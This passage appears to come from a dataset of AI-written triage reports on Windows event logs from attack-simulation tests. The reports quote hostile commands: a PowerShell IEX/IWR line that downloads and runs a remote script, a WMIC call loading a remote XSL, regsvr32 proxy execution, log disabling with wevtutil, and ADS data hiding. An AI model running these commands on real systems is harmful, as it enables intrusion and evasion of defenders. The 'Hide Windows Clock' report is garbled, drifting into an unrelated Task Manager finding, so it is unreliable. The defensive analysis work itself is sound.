  - A number of instances where ""wevtutil.exe"" are executed might suggest attempts to manage or clear event logs (ProcessIds 5284, 5664, 6056, 6040, 4224). However, without knowing the command-line arguments, the intentions are unclear.
  - The execution of ""cmd.exe"" with a suspicious command line is concerning (ProcessId 5756). Specifically, this command uses `regsvr32.exe` to register a DLL located in a temporary directory, which is not typical for standard operations and might suggest malicious payload execution.
  - The command ""C:\\Windows\\system32\\regsvr32.exe /s /i \""C:\\Users\\ADMIN\\AppData\\Local\\Temp\\file\\data.010\\bin\\AllTheThingsx86.dll\"""" is being executed via cmd.exe (EventRecordID 18017), which strongly suggests malicious intent. This command is sometimes used in attacks to execute scripts embedded in DLL files.
  - Multiple ""conhost.exe"" processes are executed with each ""cmd.exe"" and other process executions. While ""conhost.exe"" itself is not inherently suspicious, its association with potentially malicious processes is noteworthy.

**PowerShell Log:**
- The PowerShell log section does not contain any entries, preventing insight into the activities performed by the PowerShell process observed in the Sysmon logs.

**Assessment:**
The logs reveal multiple suspicious activities primarily revolving around the execution of PowerShell, cmd.exe with specific commands, and DLL registrations using regsvr32.exe. The pattern and nature of these processes, especially DLL registration from a temporary directory, often align with known attack techniques (such as DLL hijacking or proxy execution).

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
1. **Immediate Actions:**
   - Isolate the affected system (Server002) to prevent potential lateral movement within the network.
   - Initiate a detailed forensic investigation focusing on recently modified files and executed commands.
  
2. **Threat Mitigation:**

Add Root Certificate to CurrentUser Certificate Store,"Upon analyzing the provided Windows event logs, the following observations were made:

1. **PowerShell Execution**: 
   - Multiple PowerShell events indicate the execution of a command that uses `Invoke-Expression (IEX)` to execute a script fetched from a remote location. The command is `IEX (IWR 'https://github.com/file/file-file/raw/master/files/data.004/src/RemoteCertTrust.ps1' -UseBasicParsing)`.
   - The `Invoke-WebRequest (IWR)` is used in conjunction with downloading and executing scripts, which is a common technique in PowerShell-based attacks to avoid detection.

2. **Sysmon Logs**:
   - The Sysmon logs corroborate the PowerShell activity with associated process creation events showing the same `powershell.exe` command line.
   - Several executions of `wevtutil.exe` and `conhost.exe` by `SERVER002\admin_test` just before the PowerShell activity. These might be legitimate but could also be indicative of privilege escalation or system reconnaissance.

3. **Mixed Legitimacy Operations**: 
   - Activities related to Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateSetup_X86_1.3.195.27.exe`, etc.) are present. These could be part of a routine update, given their alignment with expected software update paths and system integrity levels.

### Assessment:
- **Suspicious/Malicious Indicators**:
  - The execution of PowerShell with the `Invoke-Expression` retrieving a script from an external source is highly suspicious and likely indicates malicious intent. Such activity can lead to the execution of potentially harmful payloads fetched from the internet.
  - This is exacerbated by the lack of associated Windows security or system logs identifying triggered administrative actions, resulting in potential oversight from native Windows security controls.

- **Benign Indicators**:
  - Microsoft Edge Update operations appear routine and benign, aligning with typical software maintenance tasks initiated by valid system processes.

### Conclusion:
The primary concern revolves around the suspicious PowerShell activity indicating a potential compromise involving remote script execution. This behavior should be considered a serious risk and investigated further, given the associated threat of executing untrusted code.

### Resolution: MALICIOUS

### Guidance on How to Proceed:
1. **Immediate Isolation**: 
   - Isolate the affected machine (Server002) from the network to prevent further potential malicious communications or lateral movement.

2. **Detailed Investigation**:
   - Retrieve and analyze the script hosted at the specified URL to identify the scope and impact of the malicious activity.
   - Conduct a thorough forensic investigation into the user's activities, particularly the account 'SERVER002\admin_test', to determine how the compromise occurred.

3. **Remediation**:
   - Remove or quarantine any detected malware or scripts executed from this PowerShell command.
   - Update antivirus definitions and ensure the Endpoint Detection and Response (EDR) system is properly configured to detect such PowerShell activity.

4. **Review and Strengthen Security Posture**:
   - Strengthen system monitoring capabilities, including implementing strict controls around PowerShell execution and logging configurations.
   - Educate staff on recognizing phishing attempts or malicious links which could lead to similar situations."
Invoke HTML Application - JScript Engine with Rundll32 and Inline Protocol Handler,"Upon analyzing the provided Windows event logs, the following observations have been made:

### Suspicious and Anomalous Behavior:

1. **PowerShell Execution with Obfuscation (EventID: 1, Process: `powershell.exe`, CommandLine Involves `Invoke-ATHHTMLApplication`):**
   - This PowerShell command appears to execute using `Invoke-ATHHTMLApplication` with `JScript` through `rundll32.exe`. This is indicative of potential script execution that might be used for malicious purposes, such as downloading or executing additional payloads. 
   - The command-line argument does not follow typical administrative or scripting practices and may be an attempt to obfuscate malicious actions.

2. **Frequent Utilization of Critical System Tools as `wevtutil.exe` and `conhost.exe`:**
   - The repeated execution of `wevtutil.exe` and `conhost.exe` in quick succession, particularly by a non-system user account (`SERVER002\admin_test`), might suggest attempts to manipulate event logs or perform unauthorized actions on the system.
   - While these utilities have legitimate uses, their frequent invocation in such a short time span might point to log clearing or process manipulation.
  
3. **Processes Spawned Under High Integrity Levels:**
   - Several processes are executed with a high integrity level, possibly indicating privilege escalation or misuse of elevated privileges for potentially malicious actions.

4. **Unusual Series of Process Spawn Events:**
   - Host process `wsmprovhost.exe` (Windows Remote Management Host Process) spawning subprocesses such as `whoami.exe`, `hostname.exe`, and `powershell.exe` could be considered usual in some scenarios but may also indicate an attempt to probe the environment if initiated unexpectedly.

5. **Multiple System-Level Executions of Microsoft Edge Installer:**
   - The logs show numerous execution events related to Microsoft Edge Update, which might be legitimate, but if the context is unclear, they could serve as a disguise or execution path for other payloads.

### Assessment:

Based on these observations, the logs contain behaviors that are consistent with potentially malicious actions, particularly in the context of PowerShell being used in an obfuscated manner and system utilities running in a batch without clear, legitimate administrative tasks visible. The frequent invocation of certain utilities, especially by a non-system level administrative account, increases the likelihood of the activity being malicious rather than routine system maintenance or configuration.

### Resolution:

**MALICIOUS**

### Guidance on How to Proceed:

1. **Immediate Containment:**
   - Isolate the affected system (Server002) from the network to prevent any potential lateral movement or data exfiltration.

2. **Detailed Analysis:**
   - Analyze all command-line arguments used in PowerShell and other critical utilities in detail, looking for common patterns used in known attacks.

3. **Memory and File Forensics:**
   - Conduct a memory analysis to identify any loaded but atypically running processes, particularly those involving the PowerShell and `rundll32.exe`.

4. **Review and Audit:**
   - Review all user account activities, especially the `SERVER002\admin_test` account, to check for unauthorized access or privilege escalation instances.

5. **Event Log Review:**
   - Extract and analyze additional event logs from the targeted time frame, including security and application logs, to gain further insights into the scope and methodology of the attack.

6. **Implement Monitoring:**
   - Increase monitoring on PowerShell scripts execution and restrict access to sensitive command-line utilities using an application whitelist policy to prevent abuse.

These actions should assist in determining the full extent of the compromise, mitigate the immediate risk, and prevent recurrence."
Disable Event Logging with wevtutil,"To evaluate potential malicious activity, let's break down the significant events observed from the logs provided:

1. **Security Logs (Event ID 4672 and 4624)**:
   - The event indicates that a user with the username `admin_test` on `SERVER002` logged in using NTLM authentication from `DESKTOP-3HL5B2P`. The user was granted several elevated privileges including `SeDebugPrivilege`, `SeSecurityPrivilege`, and `SeTakeOwnershipPrivilege`. This type of privilege assignment can be benign in administrative contexts but is suspicious if this user usually doesn't require such high privileges or the access is unusual.
   
2. **Sysmon Logs (Event ID 1 and 5)**:
   - Multiple instances of `wevtutil.exe` and `cmd.exe` were executed by the user `admin_test`. The command `wevtutil sl ""Microsoft-Windows-IKE/Operational"" /e:false` was observed, which likely disables a specific event log. Disabling event logs is quite suspicious as it can be indicative of attempts to hide malicious activity.
   - Usage of commands such as `hostname.exe` and `whoami.exe` could imply reconnaissance activities where an attacker is trying to gather system information. Additionally, `conhost.exe` executions are observed which typically accompany cmd or other console operations.

3. **System and Time Change Events (Event ID 1 and 24)**:
   - Time settings were altered via `svchost.exe`, but this could often be due to synchronization with a time server. Still, change in system time should be inspected further to ensure it wasn't modified maliciously to avoid detection of other timed malicious activities.

4. **Application Logs**:
   - The Software Protection Platform Service event does not provide direct evidence of compromise but may require validation of system licensing and integrity, given other suspicious activities.

### Assessment:
Upon reviewing these logs:

- The execution of `wevtutil` to disable logs, login with elevated privileges from an external machine using NTLM, and system reconnaissance activities implies an attempt at stealth and information gathering potentially by a malicious actor. This combination generally suggests a high degree of risk.

### Guidance on How to Proceed:
1. **Resolution**: SUSPICIOUS
   - Immediate further investigation is warranted.
   - Verify with the CEO and IT department if the `admin_test` account activity matches legitimate use.
   - Monitor the account `admin_test` for any unusual or further unauthorized access.
   - Review firewall and network logs to trace logins from `DESKTOP-3HL5B2P` and the specific IP addresses 192.168.0.102, and fe80::e3b5:5371:12a8:9c77.
   - Conduct a full security audit on `SERVER002` to check for unauthorized changes or backdoors.
   - Consider temporarily restricting or revoking high privileges for the `admin_test` account until it can be verified as legitimate.

This presents a scenario that might escalate into malicious activity, and proactive protective measures should be taken while further investigation confirms suspicions."
System Binary Proxy Execution - Wlrmdr Lolbin,"Based on the provided Windows event logs, the following observations and assessments have been made:

1. **Sysmon Logs Analysis**:
   - A consistent pattern of execution of `wevtutil.exe` and `conhost.exe` under the user `SERVER002\admin_test`. While the presence of `wevtutil.exe` usage is common for querying or clearing Windows Event Logs, frequent execution in short timespans can be anomalous if not correlated with legitimate tasks (e.g., system maintenance).
   - Execution of PowerShell (`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`) with a command line involving `wlrmdr.exe`, which is unconventional and suspicious. This script calls `calc.exe`, which might indicate a test or a benign action; nonetheless, the execution through PowerShell is uncommon and may suggest a probing activity. 
   - Activity logging shows execution of the calculator app (`calc.exe`) by `wlrmdr.exe` which again might be benign but requires context validation. However, the command line indicates the process as linked to potential automation within PowerShell which is unexpected in normal user interaction. 

2. **System Logs**:
   - Noteworthy are events indicating time changes which relate to processes involving `svchost.exe`. Time alterations are suspicious as they can be exploited to cover tracks by altering logs. However, there is no explicit evidence of manual tampering without further context.

3. **Application Logs**:
   - Edge updates seem quite frequent, indicating potential active service management. But without additional anomaly markers or triggers alongside the timestamps, these appear benign.

4. **Security Logs**:
   - The logs depict a logon session with privilege attributes associated with heightened administrative powers (SeDebugPrivilege, etc.), which demands scrutiny, especially paired with the process executions in the Sysmon log, though it is not inherently malicious without abuse evidence.
   - Logon with NTLM authentication method, from an IP (`192.168.0.102`) which should be checked if it aligns with known or expected access.

5. **PowerShell Logs**:
   - A PowerShell command to execute `wlrmdr.exe` with arguments seems irregular for typical user activity. It utilizes PowerShell's capabilities to conduct operations which are usually non-interactive or automated indicating potential unauthorized scripting or testing.

### Assessment:

- **SUSPICIOUS**: This determination arises mainly due to the unconventional PowerShell usage and the conditioned events surrounding rapid executions of system utilities and calculator triggering by script. The presence of time change events and high-privileged session escalates cautiousness. 

### Recommendations:

1. **Investigation into the Purpose of PowerShell Execution**:
   - Clarify if the PowerShell command was part of automated monitoring/testing or scheduled jobs. Validate the context of `wlrmdr.exe` usage.

2. **Verification of Time Change Legitimacy**:
   - Examine if time changes were expected, such as daylight saving adjustments or intentional administration actions.

3. **Review Security Policy**:
   - Ensure that only authorized personnel can trigger such command executions, ideally verifying changes with dual or multi-factor authentication.

4. **IP and Network Activity Verification**:
   - Validate the accessing IP address source and correlate with known assets and legitimate access schedules.

Proceed by conducting a deeper forensic investigation, especially around PowerShell use and the actor behind `wlrmdr.exe`. Reassess risk exposure related to unauthorized privilege usage or malicious intentions and secure inadequacies within your system involving user and command execution monitoring policies."
Windows - Modify file last modified timestamp with PowerShell,"### Detailed Analysis of Logs

#### **PowerShell Logs**

- The PowerShell logs indicate the execution of a command to modify the `LastWriteTime` attribute of a file located at `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\data.006_timestomp.txt`. This action is known as ""timestomping,"" which is a technique often used by attackers to hide their traces by manipulating file timestamp attributes.

#### **Sysmon Logs**

- **Sysmon Event 5**:
  - Event records show multiple process creations initiated by the `admin_test` user on `Server002`. The executed processes include `powershell.exe`, `conhost.exe`, `wevtutil.exe`, and other typical system utilities. However, the execution of `powershell.exe` with the specific timestomping script is noteworthy.
  
- **Process Relationships**:
  - The PowerShell process associated with the timestomping command (`ProcessId: 6636`) appears to be initiated by `wsmprovhost.exe` with a command line typically used for remote management.
  
- **Edge Update**:
  - Microsoft Edge update processes (`MicrosoftEdgeUpdate.exe` and associated executables) are running with `NT AUTHORITY\\SYSTEM` privileges. This activity appears benign, indicative of routine software updates, and seems unrelated to the suspicious PowerShell activity.

### Assessment of the Situation

The PowerShell log entry revealing the use of a timestomping technique is a red flag. Timestomping is a common technique used by malicious actors to alter the timestamps of files, hindering forensic investigations and potentially masking unauthorized modifications or the presence of malicious software.

Additionally, the sysmon logs corroborate the execution of a PowerShell command that corresponds to timestomping, under a high integrity level by a user named `admin_test`. This information, along with the presence of a remote management host process (`wsmprovhost.exe`), could indicate unauthorized remote access to the machine.

### Identified Threats and Risks

- **Timestomping**: This technique implies an attempt to obfuscate activities on the host, which is characteristic of nefarious actions undertaken by an attacker trying to hide their tracks.
- **Potential Unauthorized Remote Access**: The presence of `wsmprovhost.exe` suggests possible usage of Windows Remote Management (WinRM), which if unauthorized, poses a significant security risk indicating potential remote infiltration.

### Recommended Actions

1. **Immediate Investigation**: Conduct a thorough investigation into the source of the PowerShell execution and verify whether it aligns with legitimate administrative tasks on `Server002`.
2. **Audit User Actions**: Verify the legitimacy of actions undertaken by the `admin_test` account, particularly those involving remote management.
3. **Triage Potential Compromise**: Evaluate the integrity of the system and check for additional signs of compromise such as unknown services, scheduled tasks, or unusual network connections.
4. **Implement Monitoring**: Increase monitoring on `Server002` for unusual activities, especially focusing on PowerShell commands and account activities.
5. **Security Awareness**: If unauthorized access is confirmed, conduct a review of security policies and provide retraining on secure practices to prevent future incidents.

### Resolution

**MALICIOUS** - The logs contain evidence of a potentially malicious activity as defined by the timestomping PowerShell command execution. Immediate investigation and remediation actions are warranted to validate and address the identified threat."
WMIC bypass using remote XSL file,"### Detailed Analysis of the Logs:

1. **Time Discrepancy:**
   - The security and system logs show a time discrepancy wherein the system time is set back slightly. This behavior can sometimes be indicative of an attempt to conceal or alter timestamps to avoid detection. However, without additional context, it might be a system or network time adjustment.

2. **Frequent Usage of Windows Administrative Tools:**
   - Processes such as `wevtutil.exe`, `hostname.exe`, `whoami.exe`, `wmic.exe`, and `cmd.exe` are executed frequently in a short period. While these are legitimate Windows binaries, their usage in a clustered time frame, especially by an admin account, might suggest scripting or automation possibly employed by an attacker for reconnaissance or other malicious operations.

3. **Anomalous Command-Line Execution:**
   - The use of `cmd.exe` with a URL (`wmic process list /FORMAT:""https://raw.githubusercontent.com/file/file-file/master/files/data/src/wmicscript.xsl""`) is suspicious. Downloading or using remote scripts could be an indicator of malicious intent or an attempt to run unauthorized scripts or actions. This behavior is a red flag and needs closer examination.

4. **Processes Running with High Integrity Level:**
   - Many processes are executed with a high integrity level, indicating they run with elevated privileges. While this could be typical on a server, combined with other suspicious activities, it might signal an attempt to exploit elevated privileges.

5. **Unusual Parent Processes:**
   - The parent process for certain executed binaries (e.g., `wsmprovhost.exe` for `cmd.exe`) doesn't typically spawn command-line interfaces or other administrative tools in normal operations. This further suggests potential unauthorized activities.

6. **Privileges Assigned:**
   - There is evidence of privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, `SeImpersonatePrivilege`, and `SeBackupPrivilege` being used, which are often targeted for exploitation in privilege escalation attacks.

### Assessment of Situation:

The current evidence points towards **SUSPICIOUS** activity. The combination of administrative utility execution in quick succession, time manipulation, and suspicious command-line invocations collectively indicate that there might be underlying unauthorized or malicious activities within the system.

### Threats or Risks Identified:

- **Remote Code Execution:** The invocation of scripts hosted remotely suggests potential remote code execution risks.
- **Intrusion or Reconnaissance:** The use of tools like `wmic`, `hostname`, and `whoami` might indicate reconnaissance activities by an attacker to gather system information.
- **Privilege Escalation:** The execution of processes with privileges could lead to higher risks if exploited maliciously.

### Guidance on How to Proceed:

1. **Isolate the Server:** Until the full scope of activities is understood, consider isolating the server to prevent potential lateral movement across the network.
2. **Conduct Memory Analysis:** Perform a more in-depth analysis of the memory and running processes to uncover potential threats or persistent malicious activity.
3. **Review Network Traffic:** Analyze network traffic logs to identify any unexpected outgoing connections that could indicate data exfiltration or command and control activity.
4. **Inspect File System Changes:** Check for new or modified scripts and executables that match the remote URLs invoked.
5. **Update Security Software:** Ensure that all security software, including anti-malware and intrusion detection systems, are up to date and scanning the system.
6. **Verify User Accounts and Privileges:** Audit user accounts and privileges to ensure they are not misconfigured or exploited.

**Resolution:** **SUSPICIOUS** - Further investigation is needed to determine the full extent and nature of the activities observed."
DisallowRun Execution Of Certain Applications,"### Analysis:

1. **Repeated Execution of `wevtutil.exe` and `conhost.exe`:**
   - In the given Sysmon logs, there are several entries showing the execution of `C:\Windows\System32\wevtutil.exe` and `C:\Windows\System32\conhost.exe` by the user `SERVER002\admin_test`. The `wevtutil.exe` is a legitimate Windows utility used to manage event logs, and `conhost.exe` is a console window host process.
   - **Observation:** The frequent and near-simultaneous invocation of these utilities in a very short time span could potentially indicate automated or batch operations, but alone do not confirm malicious intent without accompanying context. This might be script activity by an admin or automated task.

2. **Command Execution by `cmd.exe`:**
   - The event with `cmd.exe` attempts to modify registry settings concerning `DisallowRun`, indicating an intention to modify the system's policy to block certain applications (`regedit.exe` and `cmd.exe`) from running. This can be a sign of trying to hinder administrative tools to prevent detection or recovery from a compromise.
   - **Observation:** This behavior is highly suspicious as it attempts to restrict the launching of command tools which could be used by someone trying to evade detection.

3. **Process Creation of `reg.exe`:**
   - There are processes where `reg.exe` is used to modify the registry to disallow certain tools. The accompanying processes (`regedit.exe`, `cmd.exe`) try to disable admin tools, which can be perceived as an effort to limit system intervention.
   - **Observation:** This suggests potential unwanted or malicious behavior, as altering system policies to prevent usage of administrative tools is generally indicative of an attempt to maintain persistence and prevent detection.

4. **Attempts to Gather User Information (`whoami.exe`) and System Information (`hostname.exe`):**
   - The execution of `whoami.exe` and `hostname.exe` points towards a reconnaissance action, a common tactic in early stages of an attack to gather information on the environment.
   - **Observation:** While these tools can certainly be used in legitimate scripts or by an admin, in the context of registry modifications to disallow system tools, these processes become more suspicious.

### Threat Assessment and Resolution:

- **Threat Level:** The combination of registry modifications to disallow critical admin tools and the repetition of process executions for system utilities and reconnaissance tools indicates suspicious behavior that could lead to a potential compromise.
- **Resolution:** **SUSPICIOUS**

### Guidance on How to Proceed:
- **Immediate Action:**
  - Isolate the system from the network to prevent further unauthorized access.
  - Notify the IT and security teams about the suspicious behavior for immediate review.
  
- **Further Investigation:**
  - Examine accompanying user activities, such as remote logins, in the timespan around these activities.
  - Investigate any recent changes or deployments on Server002 to understand if these actions align with any scheduled or approved tasks.
  - Conduct a full anti-malware scan and review EDR alerts/logs for any correlated entries not initially flagged.
  - Enforce auditing and monitor for suspicious user activities or anomalies in behavior detecting this user or system.

- **Preventive Measures:**
  - Review and possibly enhance security policies, including access controls to event logs and system utilities.
  - Reinforce user education regarding suspicious activities and potential threats.

This case is distinctly suspicious due to the combination of reconnaissance and attempts to restrict important system utilities, and requires immediate attention to prevent potential escalation or spread."
Mimic Ransomware - Enable Multiple User Sessions,"### Detailed Analysis of the Logs:

**Sysmon Log Analysis:**

1. **Repeated Execution of `wevtutil.exe` and `conhost.exe`:**
   - The logs show repetitive execution of `C:\Windows\System32\wevtutil.exe` and `C:\Windows\System32\conhost.exe`. 
   - These executions belong to a user, `SERVER002\admin_test`, indicating an administrative user is actively interacting with event logs, which can be legitimate under certain scenarios or potentially suspicious if continuous or automated.

2. **`whoami.exe` Execution:**
   - The `whoami.exe` process is executed, possibly to verify user credentials or context. This by itself is not necessarily malicious, but in a script or malicious sequence could be used to ascertain user privileges.

3. **Registry Modification through CMD:**
   - The command `""cmd.exe"" /c reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Winlogon /t REG_DWORD /v AllowMultipleTSSessions /d 1 /f` was executed.
   - This command modifies the registry to allow multiple Terminal Services sessions. Modifying the registry in this manner isn't typical user behavior and can be an indicator of an attempt to maintain persistence or enable remote access.

**Security Log Analysis:**

- **Time Synchronization:**
  - The security logs indicate a change in system time, which could indicate legitimate time synchronization or be suspicious if done to manipulate time-sensitive logs or tasks.

**Application Log Analysis:**

- **Software Protection Platform Service:**
  - Logs from the Microsoft-Windows-Security-SPP indicate normal operation, such as service updates or checks, and do not direct to immediate abnormal activities.

**System Log Analysis:**

- **System Time Change Events:**
  - Similar to security logs, the system logs also record time change events via the `svchost.exe` process. This corroborates the time adjustments seen and might need further verification to rule out malicious intent.

### Assessment:

- The primary suspicious activity is the registry modification (`AllowMultipleTSSessions`), which may be indicative of a configuration change to allow multiple RDP sessions, commonly associated with attempts to facilitate unauthorized remote access.
- The frequent execution of processes like `wevtutil.exe` and command-line tools (`cmd.exe`, `whoami.exe`) might indicate scripted or automated activities, which could be consistent with administrative overhead or penetration steps (e.g., reconnaissance, privilege checking).

### Resolution:

**SUSPICIOUS:**
- The activity concerning registry changes warrants further investigation, especially in the context of multiple Terminal Services sessions.
- Verify whether these actions were authorized by the administrative user, and investigate any suspicious accounts or automated scripts.
- It is essential to check other indicators or corroborate with other logs (such as network logs) to provide further context to these activities.

### Guidance on How to Proceed:

1. **Immediate Investigation:**
   - Investigate the administrative account `SERVER002\admin_test` for suspicious activity, ensure actions were authorized.
   - Review the creation times, originating IP addresses, and access points related to the RDP sessions.

2. **Enhanced Monitoring:**
   - Implement or increase monitoring on similar registry modifications.
   - Set up alerts for unusual activity from administrative accounts or changes to critical system settings.

3. **Containment and Analysis:**
   - If unauthorized activity is suspected, isolate the host to prevent lateral movement.
   - Conduct a forensic analysis on the system to verify the integrity of all important files and configurations.

This approach ensures that while suspicious activity is monitored and investigated, unnecessary panic or resource allocation is avoided until a definitive malicious nature is confirmed."
Rundll32 ieadvpack.dll Execution,"During the analysis of the provided Sysmon logs, several potential indicators of suspicious or malicious activity were identified:

1. **PowerShell Execution:** There is an execution of `powershell.exe` by the user `SERVER002\admin_test`. Executing PowerShell, particularly by an administrator account, can be suspicious if it hasn't been pre-approved or if it's not part of standard operations, especially without associated command-line details in the log.
   
2. **Usage of `wevtutil.exe`:** This tool can be used to clear event logs, which is a common method employed by attackers to cover their tracks. In the logs, there are multiple instances of `wevtutil.exe` being executed rapidly. This could imply a log-clearing operation, which should be considered highly suspicious.
   
3. **Command-Line Execution via `cmd.exe`:** There is evidence of a `cmd.exe` process executing the command `rundll32.exe ieadvpack.dll,LaunchINFSection ...`. The Rundll32 utility is often used by malicious actors to execute DLLs or scripts in a stealthy manner. This particular execution seems to be calling an INF installation with potential for malicious configuration changes.

4. **`whoami.exe` Execution:** While `whoami.exe` is a typical command used to check current permissions, if tied with other activities like those mentioned above, it may indicate privilege enumeration by a malicious actor.

5. **Elevated Privileges:** The log entries also mention events related to elevated privileges for the `SYSTEM` account, though this is common for system operations, in the context of other suspicious activities, it warrants additional review.

6. **Microsoft Edge Update Processes:** There are multiple Microsoft Edge Update processes (e.g., `MicrosoftEdgeUpdate.exe`) running, which can be a scheduled task or auto-update operation. Though not directly suspicious, if there's a known vulnerability within the update process or if device usage is outside typical operations, it requires verification.

Based on the collection of the above findings:

- The presence of multiple `wevtutil.exe` executions in combination with `cmd.exe` running potentially harmful commands like `rundll32` suggests unauthorized and potentially obfuscated behavior.
- These activities, particularly in a sequence and executed rapidly, should be flagged as they could indicate an active compromise aimed at persistence, data exfiltration, or disruption.

**Resolution: SUSPICIOUS**

### Assessment and Recommendations
1. **Isolate the Device:** Given the potential threat and suspicious activity observed, immediately isolate the device from the network to prevent further compromise.
2. **Detailed Forensic Investigation:** Conduct a forensic analysis of the machine to determine the scope and nature of the activities. Check for unauthorized changes, especially in the directory referenced by `rundll32`.
3. **Log Review and Monitoring:** Review other system logs for further anomalies. Enhance monitoring on similar systems for identical trigger events.
4. **User Verification:** Confirm the user and the context of `admin_test` account activity to detect if it was truly the intended user or potentially a compromised account.
5. **Security Updates:** Ensure the latest security patches are applied to close any vulnerabilities that may have been exploited.
6. **Review and Enhance Security Policies:** Review access and execution permissions, particularly for tools like PowerShell and CMD and educate users on potential threat vectors.

In conclusion, while the evidence gathered does not definitively confirm malicious activity without deeper forensic analysis, the nature and combination of events observed mandate a classification of ""SUSPICIOUS"" pending further review."
Create Hidden Directory via $index_allocation,"After analyzing the provided Windows event logs, here are my findings:

### Suspicious or Anomalous Behavior:
1. **Time Synchronization Events:**
   - There are multiple entries (EventID: 4616 in the Security log) related to time changes within a very short time frame, initiated by the ""LOCAL SERVICE"" account. These logs might simply indicate system clock synchronization, but frequent time changes can sometimes be leveraged by malicious activities to cover tracks.

2. **Command Execution with cmd.exe:**
   - A particularly suspicious entry is found in the Sysmon log (EventRecordID: 18006) where `cmd.exe` is executed with the command line arguments `\""cmd.exe\"" /c md %%temp%%\\...$.......::$index_allocation & echo too many secrets > %%temp%%\\...$.......::$index_allocation\\secrets.txt`. Creating alternate data streams (indicated by `::$index_allocation`) and writing to them is highly unusual and often associated with hiding data, a common technique used by attackers.

3. **Process Events with wevtutil.exe:**
   - Multiple invocations of `wevtutil.exe` (which is used for event log management) in quick succession may indicate an attempt to clear or manipulate event logs.

### Indicators of Malicious Activity:
- The command involving `md %%temp%%\\...$.......::$index_allocation & echo too many secrets` suggests potential data hiding or obfuscation attempts, indicating a high likelihood of malicious activity. The use of the cmd.exe and alternate data stream is a strong indicator of suspicious/malicious intents.

### Clear Assessment:
- The execution of command lines that manipulate file structures in a complex manner (using alternate data streams) typically implies attempts to conceal activities or data, which is a tactic employed in cyber compromises.
- The use of `wevtutil.exe` repeatedly might be part of activities to cover tracks by tampering with event logs.

### Threats or Risks Identified:
- The behavior noted, particularly the alternate data stream modifications and potential log tampering, are signs of potential compromise, suggesting the system might be under attack or already compromised.

### Guidance on How to Proceed:
1. **Immediate Actions:**
   - Isolate the affected system to prevent further lateral movement or data exfiltration.
   - Conduct a detailed forensic investigation to understand the full scope of the breach.
   - Initiate incident response protocols, including resetting potentially compromised user credentials.

2. **Long-term Measures:**
   - Implement enhanced monitoring for similar behavior in the future.
   - Conduct a security audit and patch any vulnerabilities found.

### Resolution:
- **MALICIOUS**: The logs demonstrate behaviors consistent with known malicious activities, such as data hiding via alternate data streams and potential event log manipulation, indicating the system has likely been compromised."
Hide Windows Clock Group Policy Feature,"**Analysis of Windows Event Logs**

The provided logs display a series of events captured by Sysmon on a computer named Server002. These logs capture process creations, deletions, and other critical operations.

### Observations:
1. **Wevtutil and Conhost Activity:**
   - The set of logs from Server002 shows consistent execution of system utilities, specifically `wevtutil.exe` and `conhost.exe`, multiple times by a user account SERVER002\admin_test. These tools are legitimate Windows processes but can be used by attackers. The `wevtutil.exe` tool is used for event log management, and `conhost.exe` hosts command prompt sessions.
   - The high frequency of these executions without explicit reasons within the logs raises suspicion, although there's no clear indication of malicious activities solely based on these events. 

2. **Persistence Mechanism:**
   - A `cmd.exe` process is executing the command `""cmd.exe"" /c reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v HideClock /t REG_DWORD /d 1 /f""`. This command alters the Windows registry to hide the clock in the system's taskbar. This could be an indicator of a persistence mechanism or an attempt to hide certain UI elements for stealth purposes.

3. **PowerShell & Other Scripting Activity:**
   - While there are no explicit PowerShell logs, typical signs of malicious activity often involve PowerShell misuse. The absence could be indicative of attempts to avoid easy detection; however, without further PowerShell log entries, this remains speculative.

4. **High Integrity Level:**
   - Processes run by SERVER002\admin_test maintain a high integrity level. While normal for an admin task, in a broader context, if these were unauthorized, it would be concerning for privilege escalation or misuse.

5. **Edge Update Processes:**
   - A high volume of Microsoft Edge Update related processes executed in a brief period. Since these are legitimate tasks, repeated and clustered execution might indicate a regular, scheduled update. 

6. **General System Activity:**
   - System and Application logs do not display any significant irregularities outside the context of the operations seen in the Sysmon logs. The presence of a consistent update check and various normal utility executions suggest routine, although slightly irregular, system management activities.

   - Processes such as `wevtutil.exe` and `conhost.exe` being spawned under the `SERVER002\admin_test` user, around the same time, indicate potential scripted or automated actions. However, without additional context or network indicators, these alone might not clearly indicate malicious intent.

3. **Normal Microsoft Edge Update Processes**:
   - There is a series of events under Sysmon logs indicating activity from `MicrosoftEdgeUpdate.exe`. These activities are consistent with Microsoft Edge updates and don't exhibit any immediate signs of unusual or malicious behavior related to Edge updates.

4. **Application and Security Logs**:
   - The security logs show time changes, which can be typical in certain operational contexts; however, looking closely at the time difference adjustments, this does not seem connected explicitly to the suspicious usage of disabling the Task Manager.
   - The application logs with `edgeupdate` service stopping do not inherently raise suspicion due to its routine service nature, unless correlated with other malicious activities.

**Assessment and Guidance**:

- **Suspicious Findings**: The execution of commands aiming to disable the Task Manager is suspicious and potentially malicious, depending on further context, like if similar processes are known to be used in automated scripts by admins (which would require collaboration with IT for clarification).
  
- **Threats/Risks Identified**: A potential risk from restricting access to Task Manager on the CEO's machine suggests attempting to hide processes, potentially malware trying to persist without detection by the user.

- **Next Steps**:
  - Conduct a deeper investigation into the `SERVER002\admin_test` account activities and verify whether such actions were expected (e.g., by a script run by IT) or are malicious.
  - Use integrity tools or endpoint protection solutions to check for known threats using the observed `cmd.exe` changes associated with malware signatures.
  - Ensure the machine is monitored for any further unusual activities and could potentially need isolation if decisive malicious indicators continue to arise.

**Final Resolution**: **SUSPICIOUS** - The logs contain activity that requires further investigation to rule out potential compromise and clarify the purpose of disabling Task Manager. Collaboration with IT and a review of current running processes and scripts within the environment will aid in determining if these actions were authorized or represent a threat."
Do Not Connect To Win Update,"Upon reviewing the logs provided, here is a detailed analysis of the activity:

1. **System Log:**
   - The events mostly pertain to time adjustments via `svchost.exe` process, which is standard behavior for Windows time synchronization using `time.windows.com` as a time source. There is no indication that this activity is malicious or suspicious by itself.

2. **Sysmon Log:**
   - Various processes like `whoami.exe`, `wevtutil.exe`, `hostname.exe`, `cmd.exe`, and `reg.exe` are executed under the `admin_test` user session on `Server002`.
   - `whoami.exe` and `hostname.exe` usage can be considered normal to check the current user context and machine name.
